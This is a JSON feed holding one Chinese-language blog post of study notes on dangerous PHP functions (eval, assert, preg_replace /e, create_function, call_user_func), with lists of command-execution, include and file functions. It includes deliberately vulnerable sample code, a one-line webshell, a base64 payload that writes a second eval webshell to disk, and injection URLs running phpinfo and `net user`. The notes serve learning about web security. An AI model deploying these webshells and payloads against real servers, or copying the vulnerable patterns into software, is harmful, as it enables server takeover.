{
    "version": "https://jsonfeed.org/version/1",
    "title": "Go Forward • All posts by \"php危险函数\" tag",
    "description": "欢迎来到我的博客(*^﹏^*),本人为新人,你可以阅读我的学习笔记并提出独到的见解~我们将互相学习,共同进步,望大佬们勿喷",
    "home_page_url": "http://chungod.github.io",
    "items": [
        {
            "id": "http://chungod.github.io/2021/05/04/test/php%E5%8D%B1%E9%99%A9%E5%87%BD%E6%95%B0/",
            "url": "http://chungod.github.io/2021/05/04/test/php%E5%8D%B1%E9%99%A9%E5%87%BD%E6%95%B0/",
            "title": "php危险函数",
            "date_published": "2021-05-04T04:34:41.000Z",
            "content_html": "<h2 id=\"php常见危险函数\"><a class=\"markdownIt-Anchor\" href=\"#php常见危险函数\">#</a> PHP 常见危险函数</h2>\n<h3 id=\"eval函数\"><a class=\"markdownIt-Anchor\" href=\"#eval函数\">#</a> eval () 函数</h3>\n<p>定义和用法：</p>\n<p>eval () 函数把字符串按照 PHP 代码来计算.<br>\n 该字符串必须是合法的 PHP 代码，且必须以分号结尾。</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"variable\">$var</span> = <span class=\"string\">&quot;var&quot;</span>;</span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&quot;cmd&quot;</span>]))</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"variable\">$arg</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&quot;cmd&quot;</span>];</span><br><span class=\"line\">\t<span class=\"keyword\">eval</span>(<span class=\"string\">&quot;\\$var = <span class=\"subst\">$arg</span>;&quot;</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">echo</span> <span class=\"string\">&quot;\\$var =&quot;</span>.<span class=\"variable\">$var</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210503102521525.png\" alt=\"image-20210503102521525\"></p>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210503102807857.png\" alt=\"image-20210503102807857\"></p>\n<h3 id=\"assert函数\"><a class=\"markdownIt-Anchor\" href=\"#assert函数\">#</a> <strong>assert () 函数</strong></h3>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">assert()会检查指定的assertion并在结果为FALSE时采取适当的行动。</span><br><span class=\"line\">判断一个表达式是否成立。返回true or false。</span><br><span class=\"line\">如果 assertion 是字符串，它将会被 assert() 当做 PHP 代码来执行。</span><br></pre></td></tr></table></figure>\n<p>一般情况下，黑名单都会禁用 <code>eval()</code>  函数，所以用 <code>assert</code>  来代替 eval 来执行具体操作。</p>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210503103001094.png\" alt=\"image-20210503103001094\"></p>\n<h3 id=\"assertion函数\"><a class=\"markdownIt-Anchor\" href=\"#assertion函数\">#</a> assertion 函数</h3>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">检查一个断言是否为 FALSE。</span><br><span class=\"line\">assert() 会检查指定的 assertion 并在结果为 FALSE 时采取适当的行动。</span><br><span class=\"line\">如果 assertion 是字符串，它将会被 assert() 当做 PHP 代码来执行。</span><br></pre></td></tr></table></figure>\n<p>构造</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php $_GET[a]($_GET[b]);?&gt;  &#x2F;&#x2F;一句话木马</span><br><span class=\"line\">&#x2F;&#x2F;payload： ?a&#x3D;assert&amp;b&#x3D;&#123;fputs(fopen(base64_decode(Yy5waHA),w),base64_decode(PD9waHAgQGV2YWwJF9QT1NUW2NdKTsgPz4))&#125;;</span><br></pre></td></tr></table></figure>\n<h3 id=\"preg_replace函数\"><a class=\"markdownIt-Anchor\" href=\"#preg_replace函数\">#</a> <strong>preg_replace () 函数</strong></h3>\n<p>preg_replace 函数执行一个正则表达式的搜索和替换。</p>\n<p>代码</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">error_reporting(<span class=\"number\">0</span>);</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t<span class=\"variable\">$pattern</span> = <span class=\"variable\">$_GET</span>[pat];</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t<span class=\"variable\">$replacement</span> = <span class=\"variable\">$_GET</span>[rep];</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t<span class=\"variable\">$subject</span> = <span class=\"variable\">$_GET</span>[sub];</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$pattern</span>) &amp;&amp; <span class=\"keyword\">isset</span>(<span class=\"variable\">$replacement</span>) &amp;&amp; <span class=\"keyword\">isset</span>(<span class=\"variable\">$subject</span>))</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tpreg_replace(<span class=\"variable\">$pattern</span>, <span class=\"variable\">$replacement</span>, <span class=\"variable\">$subject</span>);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">else</span></span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">die</span>();</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?pat&#x3D;&#x2F;test&#x2F;e&amp;rep&#x3D;phpinfo()&amp;sub&#x3D;jutst test</span><br><span class=\"line\">也可以为</span><br><span class=\"line\">?pat&#x3D;&#x2F;test&#x2F;e&amp;rep&#x3D;var_dump(&#96;net user&#96;)&amp;sub&#x3D;jutst test</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">PHP 5.5.0 起， 传入 “\\e” 修饰符的时候，会产生一个 E_DEPRECATED 错误； PHP 7.0.0 起，会产生 E_WARNING 错误，同时 “\\e” 也无法起效。</span><br></pre></td></tr></table></figure>\n<h3 id=\"create_function函数\"><a class=\"markdownIt-Anchor\" href=\"#create_function函数\">#</a> create_function () 函数</h3>\n<p>string create_function ( string $args , string $code )<br>\n 函数作用：从创建一个匿名函数传递的参数，并返回一个唯一的名称</p>\n<p>代码</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">error_reporting(<span class=\"number\">0</span>);</span><br><span class=\"line\"><span class=\"variable\">$sort_by</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;sort_by&#x27;</span>];</span><br><span class=\"line\"><span class=\"variable\">$sorter</span> = <span class=\"string\">&#x27;strnatcasecmp&#x27;</span>;</span><br><span class=\"line\"><span class=\"variable\">$databases</span>=<span class=\"keyword\">array</span>(<span class=\"string\">&#x27;1234&#x27;</span>,<span class=\"string\">&#x27;4321&#x27;</span>);</span><br><span class=\"line\"><span class=\"variable\">$sort_function</span> = <span class=\"string\">&#x27; return 1 * &#x27;</span> . <span class=\"variable\">$sorter</span> . <span class=\"string\">&#x27;($a[&quot;&#x27;</span> . <span class=\"variable\">$sort_by</span> . <span class=\"string\">&#x27;&quot;], $b[&quot;&#x27;</span> . <span class=\"variable\">$sort_by</span> . <span class=\"string\">&#x27;&quot;]);&#x27;</span>;</span><br><span class=\"line\">usort(<span class=\"variable\">$databases</span>, create_function(<span class=\"string\">&#x27;$a, $b&#x27;</span>, <span class=\"variable\">$sort_function</span>));</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>构造匿名函数原型</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">test</span>(<span class=\"params\"><span class=\"variable\">$a</span>,<span class=\"variable\">$b</span></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">1</span> * <span class=\"string\">&#x27; . $sorter . &#x27;</span>(<span class=\"variable\">$a</span>[<span class=\"string\">&quot;&#x27; . <span class=\"subst\">$sort_by</span> . &#x27;&quot;</span>], <span class=\"variable\">$b</span>[<span class=\"string\">&quot;&#x27; . <span class=\"subst\">$sort_by</span> . &#x27;&quot;</span>]);</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n<p>构造 payload:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http:&#x2F;&#x2F;127.0.0.1&#x2F;test3.php?sort_by&#x3D;%27%22]);&#125;phpinfo();&#x2F;*</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210503104641807.png\" alt=\"image-20210503104641807\"></p>\n<h3 id=\"call_user_func函数\"><a class=\"markdownIt-Anchor\" href=\"#call_user_func函数\">#</a> call_user_func 函数</h3>\n<p>mixed call_user_func ( callable $callback [, mixed $parameter [, mixed $… ]] )<br>\n 第一个参数 callback 是被调用的回调函数，其余参数是回调函数的参数。</p>\n<p>代码</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> <span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">    <span class=\"variable\">$filter</span>= <span class=\"string\">&#x27;assert&#x27;</span>;</span><br><span class=\"line\">    <span class=\"variable\">$value</span> = <span class=\"string\">&#x27;phpinfo()&#x27;</span>;</span><br><span class=\"line\">    call_user_func(<span class=\"variable\">$filter</span>, <span class=\"variable\">$value</span>);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210503111406856.png\" alt=\"image-20210503111406856\"></p>\n<h3 id=\"call_user_func_array函数\"><a class=\"markdownIt-Anchor\" href=\"#call_user_func_array函数\">#</a> call_user_func_array 函数</h3>\n<p>call_user_func_array — 调用回调函数，并把一个数组参数作为回调函数的参数</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">把第一个参数作为回调函数（callback）调用，把参数数组作（param_arr）为回调函数的的参数传入。</span><br></pre></td></tr></table></figure>\n<h2 id=\"命令执行函数\"><a class=\"markdownIt-Anchor\" href=\"#命令执行函数\">#</a> 命令执行函数</h2>\n<ul>\n<li>exec ()  执行一个外部程序</li>\n<li>passthru ()  执行外部程序并且显示原始输出</li>\n<li>proc_open ()  执行一个命令，并且打开用来输入 / 输出的文件指针</li>\n<li>shell_exec ()  通过 shell 环境执行命令，将完整的输出以字符串方式返回</li>\n<li>system ()  执行外部程序，并且显示输出</li>\n<li>popen ()  通过 popen () 的参数传递一条命令，并对 popen () 所打开的文件进行执行</li>\n<li>escapeshellcmd () 对字符串中可能会欺骗 shell 命令执行任意命令的字符转义</li>\n</ul>\n<h2 id=\"包含函数\"><a class=\"markdownIt-Anchor\" href=\"#包含函数\">#</a> 包含函数</h2>\n<p>require、include、require_once、include_once<br>\n 包含函数 一共有四个，主要作用为包含并运行指定文件。</p>\n<ul>\n<li>require 和 include 几乎完全一样，除了处理失败的方式不同之外。require 在出错时产生 (E_COMPILE_ERROR) 级别的错误。换句话说将导致脚本中止而 include 只产生警告（E_WARNING），脚本会继续运行。</li>\n<li>include 语句包含并运行指定文件</li>\n<li>require_once 语句和 require 语句完全相同，唯一区别是 PHP 会检查该文件是否已经被包含过，如果是则不会再次包含。</li>\n<li><em>include_once</em> 语句在脚本执行期间包含并运行指定文件。此行为和 <span class=\"exturl\" data-url=\"aHR0cDovL3BocC5uZXQvbWFudWFsL3poL2Z1bmN0aW9uLmluY2x1ZGUucGhw\">include</span> 语句类似，唯一区别是如果该文件中已经被包含过，则不会再次包含。</li>\n</ul>\n<h2 id=\"文件操作函数官方文档\"><a class=\"markdownIt-Anchor\" href=\"#文件操作函数官方文档\">#</a> 文件操作函数 (官方文档)</h2>\n<ul>\n<li>copy  拷贝文件 <span class=\"exturl\" data-url=\"aHR0cDovL3BocC5uZXQvbWFudWFsL3poL2Z1bmN0aW9uLmNvcHkucGhw\">http://php.net/manual/zh/function.copy.php</span></li>\n<li>file_get_contents  将整个文件读入一个字符串 <span class=\"exturl\" data-url=\"aHR0cDovL3BocC5uZXQvbWFudWFsL3poL2Z1bmN0aW9uLmZpbGUtZ2V0LWNvbnRlbnRzLnBocA==\">http://php.net/manual/zh/function.file-get-contents.php</span></li>\n<li>file_put_contents  将一个字符串写入文件  <span class=\"exturl\" data-url=\"aHR0cDovL3BocC5uZXQvbWFudWFsL3poL2Z1bmN0aW9uLmZpbGUtcHV0LWNvbnRlbnRzLnBocA==\">http://php.net/manual/zh/function.file-put-contents.php</span></li>\n<li>file  把整个文件读入到一个数组中 <span class=\"exturl\" data-url=\"aHR0cDovL3BocC5uZXQvbWFudWFsL3poL2Z1bmN0aW9uLmZpbGUucGhw\">http://php.net/manual/zh/function.file.php</span></li>\n<li>fopen  打开文件或者 URL  <span class=\"exturl\" data-url=\"aHR0cDovL3BocC5uZXQvbWFudWFsL3poL2Z1bmN0aW9uLmZvcGVuLnBocA==\">http://php.net/manual/zh/function.fopen.php</span></li>\n<li>move_uploaded_file 将上传的文件移动到新位置 <span class=\"exturl\" data-url=\"aHR0cDovL3BocC5uZXQvbWFudWFsL3poL2Z1bmN0aW9uLm1vdmUtdXBsb2FkZWQtZmlsZS5waHA=\">http://php.net/manual/zh/function.move-uploaded-file.php</span></li>\n<li>readfile  输出文件 <span class=\"exturl\" data-url=\"aHR0cDovL3BocC5uZXQvbWFudWFsL3poL2Z1bmN0aW9uLnJlYWRmaWxlLnBocA==\">http://php.net/manual/zh/function.readfile.php</span></li>\n<li>rename  重命名一个文件目录 <span class=\"exturl\" data-url=\"aHR0cDovL3BocC5uZXQvbWFudWFsL3poL2Z1bmN0aW9uLnJlbmFtZS5waHA=\">http://php.net/manual/zh/function.rename.php</span></li>\n<li>rmdir  删除目录 <span class=\"exturl\" data-url=\"aHR0cDovL3BocC5uZXQvbWFudWFsL3poL2Z1bmN0aW9uLnJtZGlyLnBocA==\">http://php.net/manual/zh/function.rmdir.php</span></li>\n<li>unlink &amp; delete  删除文件  <span class=\"exturl\" data-url=\"aHR0cDovL3BocC5uZXQvbWFudWFsL3poL2Z1bmN0aW9uLnVubGluay5waHA=\">http://php.net/manual/zh/function.unlink.php</span></li>\n</ul>\n<h2 id=\"特殊函数\"><a class=\"markdownIt-Anchor\" href=\"#特殊函数\">#</a> 特殊函数</h2>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">phpinfo — 输出关于 PHP 配置的信息</span><br><span class=\"line\">symlink — 建立符号连接</span><br><span class=\"line\">readlink — 返回符号连接指向的目标</span><br><span class=\"line\">getenv — 获取一个环境变量的值</span><br><span class=\"line\">putenv — 设置环境变量的值</span><br><span class=\"line\">dl — 运行时载入一个 PHP 扩展</span><br><span class=\"line\">ini_get — 获取一个配置选项的值</span><br><span class=\"line\">ini_set  ini_alter  ini_restore</span><br><span class=\"line\">is_numeric - 数字判断 </span><br><span class=\"line\">in_array 在 haystack 中搜索 needle，如果没有设置 strict 则使用宽松的比较。</span><br></pre></td></tr></table></figure>\n<h3 id=\"变量覆盖\"><a class=\"markdownIt-Anchor\" href=\"#变量覆盖\">#</a> 变量覆盖</h3>\n<ul>\n<li>parse_str 如果 str 是 URL 传递入的查询字符串（query string），则将它解析为变量并设置到当前作用域。</li>\n<li>extract  本函数用来将变量从数组中导入到当前的符号表中。检查每个键名看是否可以作为一个合法的变量名，同时也检查和符号表中已有的变量名的冲突。</li>\n<li>mb_parse_str  解析 GET/POST/COOKIE 数据并设置全局变量。</li>\n<li>import_request_variables  将 GET／POST／Cookie 变量导入到全局作用域中。如果你禁止了 register_globals，但又想用到一些全局变量，那么此函数就很有用。</li>\n</ul>\n<p>列目录</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">glob</span><br><span class=\"line\"><span class=\"keyword\">array</span> glob ( <span class=\"keyword\">string</span> <span class=\"variable\">$pattern</span> [, <span class=\"keyword\">int</span> <span class=\"variable\">$flags</span> = <span class=\"number\">0</span> ] )</span><br><span class=\"line\">glob() 函数依照 libc glob() 函数使用的规则寻找所有与 pattern 匹配的文件路径，类似于一般 shells 所用的规则一样。不进行缩写扩展或参数替代。</span><br></pre></td></tr></table></figure>\n<h3 id=\"无参数获取信息\"><a class=\"markdownIt-Anchor\" href=\"#无参数获取信息\">#</a> 无参数获取信息</h3>\n<ul>\n<li>get_defined_vars 返回一个包含所有已定义变量列表的多维数组，这些变量包括环境变量、服务器变量和用户定义的变量。</li>\n<li>get_defined_constants 返回当前所有已定义的常量名和值。 这包含 define () 函数所创建的，也包含了所有扩展所创建的。</li>\n<li>get_defined_functions 返回一个包含所有已定义函数列表的多维数组</li>\n<li>get_included_files 返回所有被 include、 include_once、 require 和 require_once 的文件名。</li>\n</ul>\n<p>php 危险函数总结</p>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210503135420288.png\" alt=\"image-20210503135420288\"></p>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210503135446595.png\" alt=\"image-20210503135446595\"></p>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210503135503196.png\" alt=\"image-20210503135503196\"></p>\n",
            "tags": [
                "php危险函数"
            ]
        }
    ]
}